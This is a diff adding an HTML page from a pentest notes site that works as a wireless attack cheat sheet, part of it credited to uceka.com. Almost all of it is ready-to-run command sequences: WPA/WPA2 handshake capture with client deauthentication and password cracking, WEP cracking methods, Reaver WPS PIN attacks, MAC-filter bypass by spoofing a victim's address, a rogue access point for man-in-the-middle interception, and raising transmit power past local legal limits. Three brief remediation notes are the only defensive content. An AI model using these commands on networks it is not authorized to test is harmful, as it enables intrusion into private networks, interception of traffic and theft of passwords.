@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>﻿WPA2 PSK attack with aircrack-ng suite. - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\ufeffWPA2 PSK attack with aircrack-ng suite.", url: "#_top", children: [
+              {title: "WPA PSK attack with aircrack-ng suite.", url: "#wpa-psk-attack-with-aircrack-ng-suite" },
+              {title: "WEP attack with aircrack-ng suite.", url: "#wep-attack-with-aircrack-ng-suite" },
+              {title: "Rogue Access Point Testing", url: "#rogue-access-point-testing" },
+          ]},
+          {title: "ifconfig wlan0 down", url: "#ifconfig-wlan0-down", children: [
+          ]},
+          {title: "iw reg set BO", url: "#iw-reg-set-bo", children: [
+          ]},
+          {title: "iwconfig wlan0 txpower 0", url: "#iwconfig-wlan0-txpower-0", children: [
+          ]},
+          {title: "ifconfig wlan0 up", url: "#ifconfig-wlan0-up", children: [
+          ]},
+          {title: "airmon-ng start wlan0", url: "#airmon-ng-start-wlan0", children: [
+          ]},
+          {title: "airodump-ng --write capture mon0", url: "#airodump-ng-write-capture-mon0", children: [
+              {title: "Reaver", url: "#reaver" },
+              {title: "Pixie WPS", url: "#pixie-wps" },
+              {title: "Wireless Notes", url: "#wireless-notes" },
+              {title: "all credits to @uceka.com for the following section (found below) original work found here https://uceka.com/2014/05/12/wireless-penetration-testing-cheat-sheet/", url: "#all-credits-to-ucekacom-for-the-following-section-found-below-original-work-found-here-httpsucekacom20140512wireless-penetration-testing-cheat-sheet" },
+              {title: "WIRELESS ANTENNA", url: "#wireless-antenna" },
+          ]},
+          {title: "txpower is 30 (generally)", url: "#txpower-is-30-generally", children: [
+          ]},
+          {title: "txpower is depends your country, please googling", url: "#txpower-is-depends-your-country-please-googling", children: [
+              {title: "WEP CRACKING", url: "#wep-cracking" },
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac", children: [
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac_1", children: [
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac_2", children: [
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac_3", children: [
+          ]},
+          {title: "Press \u0027y\u0027 ;", url: "#press-y", children: [
+              {title: "WPA / WPA2 CRACKING", url: "#wpa-wpa2-cracking" },
+          ]},
+          {title: "or, Specific attack", url: "#or-specific-attack", children: [
+              {title: "FIND HIDDEN SSID", url: "#find-hidden-ssid" },
+              {title: "BYPASS MAC FILTERING", url: "#bypass-mac-filtering" },
+              {title: "MAN IN THE MIDDLE ATTACK", url: "#man-in-the-middle-attack" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="wpa2-psk-attack-with-aircrack-ng-suite">﻿WPA2 PSK attack with aircrack-ng suite.</h1>
+<hr />
+<p>ifconfig wlan1 # check wireless IFace
+sudo airmon-ng check kill  # kill issue causing processes
+sudo airmon-ng start wlan1 # start monitor mode
+sudo airodump-ng wlan1mon  # start capturing
+sudo airodump-ng --bssid 64:66:B3:6E:B0:8A -c 11 wlan1mon -w output
+sudo aireplay-ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan1mon   # deauthenticate the client
+sudo aircrack-ng output-01.cap dict # crack the passphrase</p>
+<h2 id="wpa-psk-attack-with-aircrack-ng-suite">WPA PSK attack with aircrack-ng suite.</h2>
+<p>Place your wireless card into Monitor Mode
+airmon-ng start wlan0</p>
+<p>Detect all available wireless AP’s and clients
+airodump-ng mon0</p>
+<p>Setting adapter channel
+iwconfig mon0 channel <channel_number></p>
+<p>Capturing the four-way handshake
+airodump-ng --channel <channel_number> --bssid <bssid> --write capture mon0</p>
+<p>You can capture the handshake passively (it takes time) or de-authenticate a client.</p>
+<p>De-authentication attack
+aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0</p>
+<p>Deauth every client - aireplay-ng -0 5 -a <bssid> mon0</p>
+<p>Dictionary Attack
+aircrack-ng -w passwords.lst capture-01.cap</p>
+<p>Brute force Attack
+crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap</p>
+<h2 id="wep-attack-with-aircrack-ng-suite">WEP attack with aircrack-ng suite.</h2>
+<p>Place your wireless card into Monitor Mode
+airmon-ng start wlan0</p>
+<p>Detect all available wireless AP’s and clients
+airodump-ng mon0</p>
+<p>Setting adapter channel
+iwconfig mon0 channel <channel_number></p>
+<p>airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)</p>
+<p>aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)</p>
+<p>aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)</p>
+<p>aircrack-ng -b (bssid) (file name-01.cap)</p>
+<h2 id="rogue-access-point-testing">Rogue Access Point Testing</h2>
+<h1 id="ifconfig-wlan0-down">ifconfig wlan0 down</h1>
+<h1 id="iw-reg-set-bo">iw reg set BO</h1>
+<h1 id="iwconfig-wlan0-txpower-0">iwconfig wlan0 txpower 0</h1>
+<h1 id="ifconfig-wlan0-up">ifconfig wlan0 up</h1>
+<h1 id="airmon-ng-start-wlan0">airmon-ng start wlan0</h1>
+<h1 id="airodump-ng-write-capture-mon0">airodump-ng --write capture mon0</h1>
+<p>root@backbox:/home/backbox# ifconfig wlan1 down
+root@backbox:/home/backbox# iw reg set BO
+root@backbox:/home/backbox# ifconfig wlan1 up
+root@backbox:/home/backbox# iwconfig wlan1 channel 13
+root@backbox:/home/backbox# iwconfig wlan1 txpower 30
+root@backbox:/home/backbox# iwconfig wlan1 rate 11M auto</p>
+<h2 id="reaver">Reaver</h2>
+<p>airmon-ng start wlan0
+airodump-ng wlan0
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1</p>
+<h2 id="pixie-wps">Pixie WPS</h2>
+<p>airmon-ng check
+airmon-ng start wlan0
+airodump-ng wlan0mon --wps
+reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1</p>
+<h2 id="wireless-notes">Wireless Notes</h2>
+<p>Wired Equivalent Privacy (WEP)
+RC4 stream cipher w/ CRC32 for integrity check
+- Attack: 
+By sniffing an ARP packet, then replaying it to get many encrypted replies with different IVs.
+- Remediation: 
+Use WPA2</p>
+<p>Wifi Protected Access (WPA)
+Temporal Key Integrity Protocol (TKIP) Message Integrity Check
+- Attack: 
+Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
+- Remediation: 
+Use long-keys</p>
+<p>Wifi Protected Access 2 (WPA2)
+Advanced Encryption Standard (AES)
+- Attack: 
+Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
+- Remediation:
+WPA-Enterprise</p>
+<hr />
+<h2 id="all-credits-to-ucekacom-for-the-following-section-found-below-original-work-found-here-httpsucekacom20140512wireless-penetration-testing-cheat-sheet">all credits to @uceka.com for the following section (found below) original work found here https://uceka.com/2014/05/12/wireless-penetration-testing-cheat-sheet/</h2>
+<h2 id="wireless-antenna">WIRELESS ANTENNA</h2>
+<p>Open the Monitor Mode
+root@uceka:~# ifconfig wlan0mon down
+root@uceka:~# iwconfig wlan0mon mode monitor
+root@uceka:~# ifconfig wlan0mon up
+Increase Wi-Fi TX Power
+root@uceka:~# iw reg set B0
+root@uceka:~# iwconfig wlan0 txpower <NmW|NdBm|off|auto></p>
+<h1 id="txpower-is-30-generally">txpower is 30 (generally)</h1>
+<h1 id="txpower-is-depends-your-country-please-googling">txpower is depends your country, please googling</h1>
+<p>root@uceka:~# iwconfig
+Change WiFi Channel
+root@uceka:~# iwconfig wlan0 channel <SetChannel(1-14)></p>
+<h2 id="wep-cracking">WEP CRACKING</h2>
+<p>Method 1 : Fake Authentication Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon</p>
+<h1 id="whats-my-mac">What’s my mac?</h1>
+<p>root@uceka:~# macchanger --show wlan0mon
+root@uceka:~# aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
+root@uceka:~# aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <OurMac> wlan0mon
+root@uceka:~# aircrack-ng -b <BSSID> <PCAP_of_FileName></p>
+<p>Method 2 : ARP Replay Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon</p>
+<h1 id="whats-my-mac_1">What’s my mac?</h1>
+<p>root@uceka:~# macchanger --show wlan0mon
+root@uceka:~# aireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OurMac> wlan0mon
+root@uceka:~# aircrack-ng -b <BSSID> <PCAP_of_FileName></p>
+<p>Method 3 : Chop Chop Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon</p>
+<h1 id="whats-my-mac_2">What’s my mac?</h1>
+<p>root@uceka:~# macchanger --show wlan0mon
+root@uceka:~# aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
+root@uceka:~# aireplay-ng -4 -b <BSSID> -h <OurMac> wlan0mon
+ #Press ‘y’ ;
+root@uceka:~# packetforge-ng -0 -a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+root@uceka:~# aireplay-ng -2 -r <FileName2> wlan0mon
+root@uceka:~# aircrack-ng <PCAP_of_FileName></p>
+<p>Method 4 : Fragmentation Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon</p>
+<h1 id="whats-my-mac_3">What’s my mac?</h1>
+<p>root@uceka:~# macchanger --show wlan0mon
+root@uceka:~# aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
+root@uceka:~# aireplay-ng -5 -b <BSSID> -h &lt; OurMac &gt; wlan0mon</p>
+<h1 id="press-y">Press 'y' ;</h1>
+<p>root@uceka:~# packetforge-ng -0 -a <BSSID> -h &lt; OurMac &gt; -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+root@uceka:~# aireplay-ng -2 -r <FileName2> wlan0mon
+root@uceka:~# aircrack-ng <PCAP_of_FileName></p>
+<p>Method 5 : SKA (Shared Key Authentication) Type Cracking
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# ifconfig wlan0mon down
+root@uceka:~# macchanger --mac <VictimMac> wlan0mon
+root@uceka:~# ifconfig wlan0mon up
+root@uceka:~# aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
+root@uceka:~# aireplay-ng --deauth 1 -a <BSSID> -h <FakedMac> wlan0mon
+root@uceka:~# aircrack-ng <PCAP_of_FileName></p>
+<h2 id="wpa-wpa2-cracking">WPA / WPA2 CRACKING</h2>
+<p>Method 1 : WPS Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# apt-get install reaver
+root@uceka:~# wash -i wlan0mon -C
+root@uceka:~# reaver -i wlan0mon -b <BSSID> -vv -S</p>
+<h1 id="or-specific-attack">or, Specific attack</h1>
+<p>root@uceka:~# reaver -i -c <Channel> -b <BSSID> -p <PinCode> -vv -S</p>
+<p>Method 2 : Dictionary Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# aircrack-ng -w <WordlistFile> -b <BSSID> <Handshaked_PCAP></p>
+<p>Method 3 : Crack with John The Ripper
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# cd /pentest/passwords/john
+root@uceka:~# john -wordlist=<Wordlist> --rules -stdout|aircrack-ng -0 -e <ESSID> -w - <PCAP_of_FileName></p>
+<p>Method 4 : Crack with coWPAtty
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# cowpatty -r <FileName> -f <Wordlist> -2 -s <SSID>
+root@uceka:~# genpmk -s <SSID> -f <Wordlist> -d <HashesFileName>
+root@uceka:~# cowpatty -r <PCAP_of_FileName> -d <HashesFileName> -2 -s <SSID></p>
+<p>Method 5 : Crack with Pyrit
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# pyrit -r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
+root@uceka:~# pyrit -i <Wordlist> import_passwords
+root@uceka:~# pyrit -e <ESSID> create_essid
+root@uceka:~# pyrit batch
+root@uceka:~# pyrit -r <PCAP_of_FileName> attack_db</p>
+<p>Method 6 : Precomputed WPA Keys Database Attack
+root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# kwrite ESSID.txt
+root@uceka:~# airolib-ng NEW_DB --import essid ESSID.txt
+root@uceka:~# airolib-ng NEW_DB --import passwd <DictionaryFile>
+root@uceka:~# airolib-ng NEW_DB --clean all
+root@uceka:~# airolib-ng NEW_DB --stats
+root@uceka:~# airolib-ng NEW_DB --batch
+root@uceka:~# airolib-ng NEW_DB --verify all
+root@uceka:~# aircrack-ng -r NEW_DB <Handshaked_PCAP></p>
+<h2 id="find-hidden-ssid">FIND HIDDEN SSID</h2>
+<p>root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <Channel> --bssid <BSSID> wlan0mon
+root@uceka:~# aireplay-ng -0 20 -a <BSSID> -c <VictimMac> wlan0mon </p>
+<h2 id="bypass-mac-filtering">BYPASS MAC FILTERING</h2>
+<p>root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
+root@uceka:~# aireplay-ng -0 10 --a <BSSID> -c <VictimMac> wlan0mon
+root@uceka:~# ifconfig wlan0mon down
+root@uceka:~# macchanger --mac <VictimMac> wlan0mon
+root@uceka:~# ifconfig wlan0mon up
+root@uceka:~# aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon</p>
+<h2 id="man-in-the-middle-attack">MAN IN THE MIDDLE ATTACK</h2>
+<p>root@uceka:~# airmon-ng start wlan0
+root@uceka:~# airbase-ng -e “<FakeBSSID>” wlan0mon
+root@uceka:~# brctl addbr <VariableName>
+root@uceka:~# brctl addif <VariableName> wlan0mon
+root@uceka:~# brctl addif <VariableName> at0
+root@uceka:~# ifconfig eth0 0.0.0.0 up
+root@uceka:~# ifconfig at0 0.0.0.0 up
+root@uceka:~# ifconfig <VariableName> up
+root@uceka:~# aireplay-ng -deauth 0 -a <victimBSSID> wlan0mon
+root@uceka:~# dhclient3 <VariableName> &amp;
+root@uceka:~# wireshark &amp;
+;select <VariableName> interface</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/edit/master/docs/explore/resource/wirelesstesting.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
